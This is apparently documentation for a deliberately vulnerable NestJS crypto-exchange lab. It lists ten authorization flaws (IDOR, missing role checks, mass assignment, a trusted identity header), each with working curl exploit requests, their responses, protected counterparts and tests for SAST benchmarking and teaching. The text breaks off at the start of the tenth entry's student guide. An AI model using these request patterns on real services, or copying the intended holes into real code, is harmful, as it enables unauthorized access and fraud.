# `ACCESS` — authorization

Ten weaknesses in three services, each an operation that answers to a token without settling what the token's holder may do. Four are the old clients' paths of `accounts`: an object read with no owner check (`ACCESS-001`), a role write with no role check (`ACCESS-003`), a profile route that takes the body as the change (`ACCESS-004`), and an internal route that believes a header (`ACCESS-005`). One query of `notifications` answers whichever user the argument names (`ACCESS-006`). Five are in `trading`: another user's object by id (`ACCESS-002`, `ACCESS-008`), an administrator's operation on a user's token (`ACCESS-007`, `ACCESS-009`), and a body merged into an entity as it arrived (`ACCESS-010`). The protected counterparts are in `apps/accounts/src/auth/auth.resolver.ts`, `apps/accounts/src/users/users.resolver.ts`, `apps/accounts/src/admin/admin.controller.ts`, `apps/accounts/src/profile/profile.resolver.ts`, `apps/accounts/src/profile/profile.controller.ts`, `apps/accounts/src/auth/auth.controller.ts`, `apps/notifications/src/alerts/alerts.resolver.ts`, `apps/notifications/src/alerts/user-alerts.resolver.ts`, `apps/trading/src/orders/orders.resolver.ts`, `apps/trading/src/orders/update-order.resolver.ts`, `apps/trading/src/wallets/wallet.resolver.ts`, `apps/trading/src/wallets/wallets-by-user.resolver.ts`, `apps/trading/src/wallets/deposit.resolver.ts`, `apps/trading/src/markets/tick-prices.resolver.ts` and `apps/trading/src/internal/internal.controller.ts`.

The `accounts` reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults). `ACCESS-006` was run on 2026-11-27 against `notifications` alone on `127.0.0.1:3103`. The `trading` scenarios were run the same day against the service alone on `127.0.0.1:4202`, through its HTTP/1.1 relay on `127.0.0.1:4212` (`$URL`), the store reset to the fake data between them; `ACCESS-007` and `ACCESS-010` were run again on 2026-11-28 against the whole lab on the port set 4600, 4601 to 4603, 4611, 4612. Each counterpart's claim is scoped: this operation, receiving the identical input, refuses it for the reason given. Nothing here says any operation is secure in general.

<a id="access-001"></a>
## ACCESS-001 — another account by identifier, with no ownership check

<a id="access-001-agent"></a>
### ACCESS-001 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `userPreferences(userId: ID!)` |
| Sink | The named account answered to any caller, in `apps/accounts/src/legacy/users-preferences.resolver.ts` |
| Flow | a user's token → any `userId` → that account's email and preferences |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`me`: the caller's own record, no argument to name another), `apps/accounts/src/users/users.resolver.ts` (`user(id)`: an administrator's operation) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-639, SAST |

<a id="access-001-student"></a>
### ACCESS-001 — student guide

An identifier in the request is a claim about *what* to read, never *who* is reading. The legacy lookup never ties the two together, so Alice's token reads Bob's record by naming Bob.

<a id="access-001-exploit"></a>
### ACCESS-001 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    --data-raw '{"query":"query ($u: ID!) { userPreferences(userId: $u) }","variables":{"u":"u-bob"}}'
{"data":{"userPreferences":{"email":"bob@vcx.exchange","preferences":{"theme":"dark","language":"en","currency":"USD","marketingEmails":"false"}}}}
```

Bob's email and preferences, on Alice's token. `me` answers the caller's own record and has no argument that could name Bob; `user(id: "u-bob")` on Alice's token is `FORBIDDEN` — the roles guard stops a user's token before the resolver runs.

<a id="access-001-safe"></a>
### ACCESS-001 — vulnerable and protected

| | Why |
| --- | --- |
| `userPreferences(userId)` (vulnerable) | The identifier decides what is read; nothing checks whose it is |
| `me` (protected) | The record is the caller's own; there is no way to ask for another account |
| `user(id)` (protected) | An administrator's operation; a user's token is refused at the guard |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the `userId` of Bob that reads his record through `userPreferences` has no argument to travel through on `me`, which answers the caller's own record, and is refused by the roles guard before `user(id)` runs for a user's token. The claim is not that an administrator's `user(id)` is harmless; only that a user's token names no other account through them.

<a id="access-001-tests"></a>
### ACCESS-001 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-001`: Alice's token reads Bob's email and preferences; `me` answers only Alice; `user(id)` refuses Alice's token.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries the request `ACCESS-001: Alice reads Bob's preferences by id`.

<a id="access-002"></a>
## ACCESS-002 — `orderDetails`: no ownership check

<a id="access-002-agent"></a>
### ACCESS-002 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/orders/order-details.resolver.ts`
- **Operation:** GraphQL `orderDetails(id: ID!)`, a signed-in user.
- **Sink:** `const order = await this.orders.byId(whole)`: the order is returned with no check of who placed it.
- **Flow:** `args.id` → `OrdersService.byId` → the order answered to the caller, whoever that is.
- **Counterparts:** `apps/trading/src/orders/orders.resolver.ts`: `order(id)` (the repository answers, then the order is checked against the caller) and `User.orders` through `_entities` (the reference names a user the caller did not choose, and the field resolver checks it).
- **Tests:** `apps/trading/test/scenarios/access.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report an object read by id with no comparison between its owner and the caller: CWE-639.

<a id="access-002-student"></a>
### ACCESS-002 — student guide

An order is somebody's: the user who placed it. A lookup by id that returns whatever the id names never asks whether the caller is that somebody, so any signed-in user reads any order, with the note its owner attached and the price its owner named.

The line (`apps/trading/src/orders/order-details.resolver.ts`):

```ts
// ACCESS-002 / CWE-639: the order is returned with no check of who placed it
const order = await this.orders.byId(whole);
```

<a id="access-002-exploit"></a>
### ACCESS-002 — exploit lab

Run on 2026-11-27 against the service alone, on `127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is Alice's token. `acc002.json` holds the variables `{"id": "2"}`.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc002.json   # id "2"
{"data":{"orderDetails":{"id":"2","userId":"u-bob","memo":"stop loss above entry","limitPrice":"66000.00"}}}
```

Alice gained Bob's order: its id, his note, the price he named.

<a id="access-002-safe"></a>
### ACCESS-002 — vulnerable and protected

| | Operation | What it does with the same id |
| --- | --- | --- |
| Vulnerable | `orderDetails(id)` | Answers whichever order the id names, to whoever asks |
| Counterpart 1 | `order(id)` | The repository answers, then the order is checked against the caller: `FORBIDDEN`, `An order is read by the user who placed it` |
| Counterpart 2 | `User.orders` through `_entities` | The reference names a user the caller did not choose; the field resolver checks it: `FORBIDDEN` |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the id `2` that hands Bob's order to Alice through `orderDetails` is refused by `order(id)`, which compares the order's user with the caller, and cannot be handed to the entity field as an id at all, which checks the representation's user instead. The claim is not that every read of an order is checked everywhere in the service; only that this id reads no other user's order through them.

<a id="access-002-tests"></a>
### ACCESS-002 — tests

`apps/trading/test/scenarios/access.int-spec.ts`, describe `ACCESS-002 — orderDetails: no ownership check`. One payload, the id `2`, sent to the vulnerable operation and to each protected counterpart:

- **The exploit:** the payload reads Bob's order, memo and price.
- **Counterpart 1:** the repository counterpart refuses it: `FORBIDDEN`, read by who placed it.
- **Counterpart 2:** the entity counterpart refuses it: `FORBIDDEN`, no identifier to change.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `ACCESS-002 orderDetails reads Bob’s order`.

<a id="access-003"></a>
## ACCESS-003 — a user's token opens an administrator's account

<a id="access-003-agent"></a>
### ACCESS-003 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `createUserAccount(input: CreateUserInput!)` |
| Sink | No role check before creating an account with the input's `role`, in `apps/accounts/src/legacy/account-creation.resolver.ts` |
| Flow | a user's token → the input says `role: ADMIN` → an administrator's account exists |
| Counterparts | `apps/accounts/src/users/users.resolver.ts` (`createUser` under `@Roles('ADMIN')`), `apps/accounts/src/admin/admin.controller.ts` (`POST /internal/admin/users`: roles guard and DTO) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-862, SAST |

<a id="access-003-student"></a>
### ACCESS-003 — student guide

Authentication is not authorization: the mutation checks that a token is present, never what the token's role is. The input carries the role of the account to create, and it is written.

<a id="access-003-exploit"></a>
### ACCESS-003 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $BOB" \
    --data-raw '{"query":"mutation ($i: CreateUserInput!) { createUserAccount(input: $i) { id email role } }","variables":{"i":{"email":"zazzles-lab-marker@vcx.exchange","displayName":"Marker Account","password":"marker-lab-only","role":"ADMIN"}}}'
{"data":{"createUserAccount":{"id":"u-c231d48b…","email":"zazzles-lab-marker@vcx.exchange","role":"ADMIN"}}}
```

The same input on Bob's token to `createUser`: `FORBIDDEN`. To `POST /internal/admin/users`: 403, the roles guard answers before the DTO is seen.

<a id="access-003-safe"></a>
### ACCESS-003 — vulnerable and protected

| | Why |
| --- | --- |
| `createUserAccount(input)` (vulnerable) | Any token is enough, and the input's `role` is written as given |
| `createUser` (protected) | `@Roles('ADMIN')`; a user's token is refused for this input |
| `POST /internal/admin/users` (protected) | The roles guard first, then a validated DTO |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the input whose `role: ADMIN` creates an administrator on Bob's token through `createUserAccount` is refused by the roles guard at `createUser` and at `POST /internal/admin/users`, before the input is looked at. The claim is not that an administrator cannot create another administrator; only that a user's token cannot through them.

<a id="access-003-tests"></a>
### ACCESS-003 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-003`: the marker account is created `ADMIN` on Bob's token and the counts say so; both counterparts refuse the same input.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries the request `ACCESS-003: Bob's token opens an administrator's account`.

<a id="access-004"></a>
## ACCESS-004 — the body of the legacy profile editor is the change

<a id="access-004-agent"></a>
### ACCESS-004 — agent reference

| | |
| --- | --- |
| Operation | REST `PATCH /internal/profile` |
| Sink | The request body assigned onto the record property by property, in `apps/accounts/src/legacy/legacy-profile.controller.ts` |
| Flow | `{"displayName":…,"role":"ADMIN"}` → every property written → the caller's own role changes |
| Counterparts | `apps/accounts/src/profile/profile.resolver.ts` (`updateProfile`: a typed input), `apps/accounts/src/profile/profile.controller.ts` (`PUT /internal/profile`: the whitelist is on, fields copied by name) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-915, SAST |

<a id="access-004-student"></a>
### ACCESS-004 — student guide

The old editor sent "the fields that changed", and the server wrote the change it was handed. A property the caller was never meant to set travels the same road as a display name, because nothing names the fields this route may write.

<a id="access-004-exploit"></a>
### ACCESS-004 — exploit lab

```console
$ curl -s -X PATCH $RELAY/internal/profile -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    -d '{"displayName":"Alice Patched","role":"ADMIN"}' | jq '{id, role}'
{"id":"u-alice","role":"ADMIN"}
```

Alice's own record says she is an administrator, and the answer said so. The same body to `PUT /internal/profile`: 400 — the DTO declares two fields and a third is an error. To `updateProfile`: `BAD_USER_INPUT` — `role` is not a field of the input, so it is refused, not written.

<a id="access-004-safe"></a>
### ACCESS-004 — vulnerable and protected

| | Why |
| --- | --- |
| `PATCH /internal/profile` (vulnerable) | The body is the change document: every property it carries is written |
| `updateProfile` (protected) | A typed input; an unknown property is refused for this payload |
| `PUT /internal/profile` (protected) | The global whitelist is on and the fields are copied by name |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the body whose `role: ADMIN` becomes Alice's own role through the legacy PATCH is refused by `updateProfile`, whose input has no such field, and by `PUT /internal/profile`, whose DTO declares two fields and answers 400 to a third. The claim is not that a profile can carry nothing an attacker wants; only that this property is written through neither.

<a id="access-004-tests"></a>
### ACCESS-004 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-004`: the PATCH writes `role: ADMIN` and the store agrees (then the lab reset restores Alice); both counterparts refuse the same body.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries the request `ACCESS-004: the PATCH body writes the role`.

<a id="access-005"></a>
## ACCESS-005 — a header believed as identity

<a id="access-005-agent"></a>
### ACCESS-005 — agent reference

| | |
| --- | --- |
| Operation | REST `GET /internal/me` |
| Sink | `x-user-id` read and trusted as the caller, in `apps/accounts/src/legacy/legacy-me.controller.ts` |
| Flow | a local caller sets the header → the route answers the account it names, with no token at all |
| Counterparts | `apps/accounts/src/auth/auth.controller.ts` (`introspect`: the token must verify), `apps/accounts/src/users/users.controller.ts` (`GET /internal/users/lookup`: the service token decides) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-807, SAST |

<a id="access-005-student"></a>
### ACCESS-005 — student guide

The old gateway put the caller's id in a header after its own check, and the route behind it believed the header forever after. A header a client can set is not a credential: on the loopback the lab lives on, any process can claim any account.

<a id="access-005-exploit"></a>
### ACCESS-005 — exploit lab

```console
$ curl -s $RELAY/internal/me -H 'x-user-id: u-admin' | jq '{id, email, role}'
{"id":"u-admin","email":"admin@vcx.exchange","role":"ADMIN"}
```

The administrator's whole profile, with no credentials at all. The same header against the counterparts:

```console
$ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/sessions/introspect \
    -H 'content-type: application/json' -H 'x-user-id: u-admin' -d '{"token":"not-a-token"}'
401
$ curl -s -o /dev/null -w '%{http_code}\n' "$RELAY/internal/users/lookup?email=admin@vcx.exchange" \
    -H 'x-user-id: u-admin'
401
```

`introspect` is closed: a token must verify first. The lookup answers the run's service token, and no header stands in for it.

<a id="access-005-safe"></a>
### ACCESS-005 — vulnerable and protected

| | Why |
| --- | --- |
| `GET /internal/me` (vulnerable) | The header is the whole proof of identity |
| `introspect` (protected) | A closed operation; the token is verified, and this request carries none that does |
| `GET /internal/users/lookup` (protected) | Only the run's service token opens it; `x-user-id` is not a credential |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the header `x-user-id: u-admin` that answers the administrator's profile with no token on the legacy route opens neither counterpart: `introspect` answers 401 because a token must verify, and the lookup answers 401 because only the run's service token opens it. The claim is not that every other route ignores the header; only that these two give it no authority.

<a id="access-005-tests"></a>
### ACCESS-005 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-005`: the header alone answers the administrator's profile; both counterparts answer 401 to the same headers.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries the request `ACCESS-005: a header believed as identity`.

<a id="access-006"></a>
## ACCESS-006 — another user's alerts by id

<a id="access-006-agent"></a>
### ACCESS-006 — agent reference

- **Scenario:** ACCESS-006, a user's object read by another user, by id.
- **Source:** `apps/notifications/src/alerts/alerts-of.resolver.ts`
- **Operation:** GraphQL `alertsOf(userId: ID!): [Alert!]!`, user.
- **Sink:** `this.alerts.of(userId)` — the user is whichever the argument names, not the caller.
- **Flow:** `userId = "u-bob"` in Alice's request → the repository's `findByUserId("u-bob")` → Bob's alerts answered to Alice.
- **Counterparts:** `apps/notifications/src/alerts/alerts.resolver.ts` (`alerts`: the user comes from the token, and there is no `userId` argument), `apps/notifications/src/alerts/user-alerts.resolver.ts` (`User.alerts`: the caller's own user, or any user for an `ADMIN`).
- **Tests:** `apps/notifications/test/scenarios/access.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report an object-level read whose user comes from the request and is never compared with the caller.

<a id="access-006-student"></a>
### ACCESS-006 — student guide

The line (`apps/notifications/src/alerts/alerts-of.resolver.ts`):

```ts
return this.alerts.of(userId); // ACCESS-006 / CWE-639: the user is whichever the argument names, so one user's alerts are answered to another
```

The service's own way of reading alerts — `alerts` — never sees a user id:
the guard puts the caller's id in the resolver, and the repository is asked
for that id and no other. `alertsOf` takes the id as an argument, for a
client that already knows whose alerts it wants, and hands it to the same
repository unchanged. Authorization lives in the word "own": nothing about
the token crosses into the query, so "Bob's alerts" and "alerts" are the
same request to it. The id is not a secret — it is in every delivery and
every federation representation — and knowing it is the whole attack. The
author's belief: "a user asking for another user's alerts is only reading
public markets."

<a id="access-006-exploit"></a>
### ACCESS-006 — exploit lab

Run on 2026-11-27 against the service alone on `127.0.0.1:3103`. `$A` is
Alice's token; Bob's seeded alert is `ETH-USD BELOW 3000.00`:

```console
$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" \
    -d '{"query":"query { alertsOf(userId: \"u-bob\") { userId symbol direction threshold label } }"}'
{"data":{"alertsOf":[{"userId":"u-bob","symbol":"ETH-USD","direction":"BELOW","threshold":"3000.00","label":"Buy the dip"}]}}
```

Alice, named nowhere in the answer's data, is answered Bob's alert by
naming his id. The same id through the counterparts:

```console
$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" -d '{"query":"{ alerts { userId symbol } }"}'
{"data":{"alerts":[{"userId":"u-alice","symbol":"BTC-USD"}]}}

$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" \
    -d '{"query":"query($r: [_Any!]!) { _entities(representations: $r) { ... on User { alerts { userId symbol } } } }","variables":{"r":[{"__typename":"User","id":"u-bob"}]}}'
{"errors":[{"message":"These fields are answered for the caller's own user, or by an administrator", … "extensions":{"code":"FORBIDDEN" …}}]}
```

her own list holds only hers, and the entity field refuses her on Bob's
representation (Bob's own token and an administrator's are answered). In
Postman: the request `ACCESS-006: another user's alerts by id`. In Burp:
send the three queries from Repeater with Alice's token.

<a id="access-006-safe"></a>
### ACCESS-006 — vulnerable and protected

| | Operation | What it does with the same id |
| --- | --- | --- |
| Vulnerable | `alertsOf` | Answers the alerts of the user the id names, to whoever asks |
| Counterpart 1 | `alerts` | The user comes from the token; there is no `userId` argument to hand the id to (`GRAPHQL_VALIDATION_FAILED`) |
| Counterpart 2 | `User.alerts` | The caller's own representation, or any for an `ADMIN`; Alice on Bob's is `FORBIDDEN` |

**Scoped claim.** Each counterpart defeats this flaw for identical input:
the id that reads Bob's alerts on the first cannot reach the repository
through either of them — one has no argument for it, the other compares
the representation's user with the caller. The claim is not that these two
queries make the service's object-level access safe; only that this id
reads no other user's alerts through them.

<a id="access-006-tests"></a>
### ACCESS-006 — tests

`apps/notifications/test/scenarios/access.int-spec.ts`, describe
`ACCESS-006: another user's alerts by id`. One attacker value — `u-bob`,
in Alice's requests:

- **The exploit:** `alertsOf` answers Bob's alert to Alice: his `userId`,
  `symbol`, `direction` and `threshold`.
- **Counterpart 1:** `alerts` answers only alerts whose `userId` is
  Alice's, Bob's is absent, and a `userId` argument is refused
  (`GRAPHQL_VALIDATION_FAILED`).
- **Counterpart 2:** `User.alerts` answers `FORBIDDEN` for Alice on Bob's
  representation, and answers Bob's own token and an administrator's.

The collection `postman/notifications/vuln-nestjs.notifications.postman_collection.json` carries four requests: `ACCESS-006: another user's alerts by id`, `ACCESS-006: the caller's own list`, `ACCESS-006: the entity field refuses Alice on Bob's representation` and `ACCESS-006: Bob's own representation answers Bob`.

<a id="access-007"></a>
## ACCESS-007 — `setReferencePrice`: a user moves a market

<a id="access-007-agent"></a>
### ACCESS-007 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/markets/set-reference-price.resolver.ts`
- **Operation:** GraphQL `setReferencePrice(symbol: String!, price: Decimal!)`, a signed-in user.
- **Sink:** `@Args('price', { type: () => DecimalScalar }) price: string`: no role check, so any signed-in caller moves the price a market fills at.
- **Flow:** `args.price` → the market's reference price written → the next market order fills at the price the caller chose.
- **Counterparts:** `apps/trading/src/markets/tick-prices.resolver.ts` (`tickPrices`, `@Roles('ADMIN')`: the price moves only by an administrator's tick), `apps/trading/src/internal/internal.controller.ts` (`POST /internal/admin/prices/tick`: behind the roles guard).
- **Tests:** `apps/trading/test/scenarios/access.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report an administrator's operation reached with no role check: CWE-862.

<a id="access-007-student"></a>
### ACCESS-007 — student guide

The reference price is what a market order fills at. Moving it is an administrator's operation: whoever can set it decides what every buyer pays. `setReferencePrice` checks that a token is present and no more, so a user sets the price and then trades at it.

The line (`apps/trading/src/markets/set-reference-price.resolver.ts`):

```ts
// ACCESS-007 / CWE-862: no role check; any signed-in caller moves the price a market fills at
@Args('price', { type: () => DecimalScalar }) price: string,
```

<a id="access-007-exploit"></a>
### ACCESS-007 — exploit lab

Run on 2026-11-28 against the whole lab, started by `pnpm start` on the port set 4600, 4601 to 4603, 4611, 4612, after a reset. `$URL` is trading's relay (`3202` on the defaults); `$A` is Alice's token. `acc007.json` holds the variables `{"symbol": "BTC-USD", "price": "1.00"}`; `acc007buy.json` a market buy of 1 BTC.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc007.json
# {"symbol": "BTC-USD", "price": "1.00"}
{"data":{"setReferencePrice":{"symbol":"BTC-USD","referencePrice":"1.00"}}}

$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc007buy.json
# a market buy of 1 BTC, which fills at the reference price
{"data":{"placeOrder":{"id":"11","status":"FILLED","limitPrice":"1.00"}}}

$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"{ wallet { asset balance } }"}' | jq -c '.data.wallet[] | select(.asset == "BTC" or .asset == "USD")'
{"asset":"BTC","balance":"1.00000000"}
{"asset":"USD","balance":"9999.00"}
```

One whole bitcoin for one dollar: the price a market fills at moved on a user's token, and the buy that followed it paid the price Alice chose.

<a id="access-007-safe"></a>
### ACCESS-007 — vulnerable and protected

| | Operation | What it does with the same price, on a user's token |
| --- | --- | --- |
| Vulnerable | `setReferencePrice(symbol, price)` | Writes the price the caller names: the market now fills at 1.00 |
| Counterpart 1 | `tickPrices` | `@Roles('ADMIN')`: a user's token is refused by the roles guard, `FORBIDDEN`, `This operation needs one of the roles ADMIN` |
| Counterpart 2 | `POST /internal/admin/prices/tick` | Behind the same guard: HTTP `403` |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the request that moves BTC-USD to a dollar on Alice's token through `setReferencePrice` is refused by the roles guard before either counterpart runs. The claim is not that an administrator's tick cannot move a market, which is its purpose; only that a user's token moves none through them.

<a id="access-007-tests"></a>
### ACCESS-007 — tests

`apps/trading/test/scenarios/access.int-spec.ts`, describe `ACCESS-007 — setReferencePrice: a user moves a market`. One payload, sent to the vulnerable operation and to each protected counterpart:

- **The exploit:** Alice sets BTC-USD to a dollar, then buys a bitcoin for a dollar.
- **Counterpart 1:** the GraphQL counterpart refuses a user: `FORBIDDEN`, needs `ADMIN`.
- **Counterpart 2:** the REST counterpart refuses a user: 403, the roles guard.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `ACCESS-007 setReferencePrice moves a market, then a bitcoin costs a dollar`.

<a id="access-008"></a>
## ACCESS-008 — `walletOf`: another user's balances by id

<a id="access-008-agent"></a>
### ACCESS-008 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/wallets/wallet-of.resolver.ts`
- **Operation:** GraphQL `walletOf(userId: ID!)`, a signed-in user.
- **Sink:** `@Args('userId', { type: () => ID }) userId: string`: the caller names any user, and the balances answer to the token alone.
- **Flow:** `args.userId` → the repository's where clause → that user's balances answered to the caller.
- **Counterparts:** `apps/trading/src/wallets/wallet.resolver.ts` (`wallet`: the caller's own balances, no `userId` argument), `apps/trading/src/wallets/wallets-by-user.resolver.ts` (`wallets(userId: ID!)`, `@Roles('ADMIN')`). `ledger`, in `apps/trading/src/wallets/ledger.resolver.ts`, takes the user from the token the same way.
- **Tests:** `apps/trading/test/scenarios/access.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report a read whose user comes from the request and is never compared with the caller: CWE-639.

<a id="access-008-student"></a>
### ACCESS-008 — student guide

A wallet belongs to one user. `walletOf` takes the user as an argument, as an administrator's lookup would, and never asks whether the caller is that user or an administrator. Knowing a user's id is the whole attack, and ids are in every order and every delivery the lab answers.

The line (`apps/trading/src/wallets/wallet-of.resolver.ts`):

```ts
// ACCESS-008 / CWE-639: the caller names any user, and the balances answer to the token alone
@Args('userId', { type: () => ID }) userId: string,
```

<a id="access-008-exploit"></a>
### ACCESS-008 — exploit lab

Run on 2026-11-27 against the service alone, on `127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is Alice's token. `acc008.json` holds the variables `{"userId": "u-erin"}`.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc008.json   # userId "u-erin"
{"data":{"walletOf":[{"asset":"BTC","balance":"0.00000000"},{"asset":"DOGE","balance":"0.00000000"},
 {"asset":"ETH","balance":"0.00000000"},{"asset":"SOL","balance":"0.00000000"},
 {"asset":"USD","balance":"500.00"},{"asset":"XRP","balance":"0.00000000"}]}}
```

Alice gained Erin's six balances, her 500.00 dollars among them.

<a id="access-008-safe"></a>
### ACCESS-008 — vulnerable and protected

| | Operation | What it does with the same id |
| --- | --- | --- |
| Vulnerable | `walletOf(userId)` | Answers the balances of the user the id names, to whoever asks |
| Counterpart 1 | `wallet` (and `ledger`) | No `userId` argument exists on either: both answer the caller's own data (Alice's `10000.00`, her one deposit entry) |
| Counterpart 2 | `wallets(userId: ID!)` | `@Roles('ADMIN')`: the identical payload on a user's token is refused, `FORBIDDEN`, `This operation needs one of the roles ADMIN` |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the id `u-erin` that reads Erin's balances through `walletOf` has no argument to travel through on the caller's own queries, and is refused by the roles guard on the administrator's lookup. The claim is not that an administrator's `wallets(userId)` is harmless; only that a user's token reads no other user's balances through them.

<a id="access-008-tests"></a>
### ACCESS-008 — tests

`apps/trading/test/scenarios/access.int-spec.ts`, describe `ACCESS-008 — walletOf: another user's balances by id`. One payload, `u-erin`, sent to the vulnerable operation and to each protected counterpart:

- **The exploit:** the payload reads Erin's six balances.
- **Counterpart 1:** the own-data counterparts have no `userId` argument to give: Alice's own.
- **Counterpart 2:** the admin counterpart refuses a user: `FORBIDDEN`.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `ACCESS-008 walletOf reads another user’s balances`.

<a id="access-009"></a>
## ACCESS-009 — `creditWallet`: a user credits a wallet

<a id="access-009-agent"></a>
### ACCESS-009 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/wallets/credit-wallet.resolver.ts`
- **Operation:** GraphQL `creditWallet(userId: ID!, amount: Decimal!)`, a signed-in user.
- **Sink:** `@Args('userId', { type: () => ID }) userId: string`: the amount is checked, the role is not; a signed-in caller is enough.
- **Flow:** `args.userId`, `args.amount` → `WalletsService.adjust` → the named wallet is credited.
- **Counterparts:** `apps/trading/src/wallets/deposit.resolver.ts` (`deposit(userId, amount)`, `@Roles('ADMIN')`), `apps/trading/src/internal/internal.controller.ts` (`POST /internal/admin/deposits`: the roles guard).
- **Tests:** `apps/trading/test/scenarios/access.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report a state change reached with no role check: CWE-862.

<a id="access-009-student"></a>
### ACCESS-009 — student guide

Crediting a wallet creates money. It is an administrator's operation, and `creditWallet` does the administrator's work, the amount validated and the wallet updated, for any signed-in caller who names a user. Validation of the amount is not authorization of the caller.

The line (`apps/trading/src/wallets/credit-wallet.resolver.ts`):

```ts
// ACCESS-009 / CWE-862: the amount is checked, the role is not; a signed-in caller is enough
@Args('userId', { type: () => ID }) userId: string,
```

<a id="access-009-exploit"></a>
### ACCESS-009 — exploit lab

Run on 2026-11-27 against the service alone, on `127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is Alice's token.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc009.json
# {"userId": "u-alice", "amount": "500.00"}
{"data":{"creditWallet":[...,{"asset":"USD","balance":"10500.00"},...]}}
```

Alice credited herself five hundred dollars on her own token.

<a id="access-009-safe"></a>
### ACCESS-009 — vulnerable and protected

| | Operation | What it does with the same body, on a user's token |
| --- | --- | --- |
| Vulnerable | `creditWallet(userId, amount)` | Credits the named wallet: 500.00 on a user's token |
| Counterpart 1 | `deposit(userId, amount)` | `@Roles('ADMIN')`: the identical payload is refused, `FORBIDDEN`, `This operation needs one of the roles ADMIN` |
| Counterpart 2 | `POST /internal/admin/deposits` | The roles guard refuses the same body: HTTP `403` |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the body that credits five hundred dollars through `creditWallet` on Alice's token is refused by the roles guard before either counterpart runs. The claim is not that an administrator cannot credit a wallet, which is the operation's purpose; only that a user's token credits none through them.

<a id="access-009-tests"></a>
### ACCESS-009 — tests

`apps/trading/test/scenarios/access.int-spec.ts`, describe `ACCESS-009 — creditWallet: a user credits a wallet`. One payload, sent to the vulnerable operation and to each protected counterpart:

- **The exploit:** Alice credits herself five hundred dollars.
- **Counterpart 1:** the GraphQL counterpart refuses a user: `FORBIDDEN`, needs `ADMIN`.
- **Counterpart 2:** the REST counterpart refuses a user: 403, the roles guard.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `ACCESS-009 creditWallet credits the caller`.

<a id="access-010"></a>
## ACCESS-010 — `PATCH /internal/orders/:id`: mass assignment

<a id="access-010-agent"></a>
### ACCESS-010 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/orders/orders-patch.controller.ts`
- **Operation:** REST `PATCH /internal/orders/:id`, a signed-in user.
- **Sink:** `Object.assign(order, body)`: the body is merged into the entity as it arrived; `status` and `userId` are properties of it.
- **Flow:** the request body → `Object.assign(order, body)` → the repository saves the entity: every property the body carries is written.
- **Counterparts:** `apps/trading/src/orders/update-order.resolver.ts` (`updateOrder(input: UpdateOrderInput!)`: the input declares `memo` alone), `apps/trading/src/internal/internal.controller.ts` (`PUT /internal/orders/:id`: the memo is read by name and nothing else of the body is read).
- **Tests:** `apps/trading/test/scenarios/access.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report a request body merged onto an entity with no allowlist of properties: CWE-915.

<a id="access-010-student"></a>
### ACCESS-010 — student guide

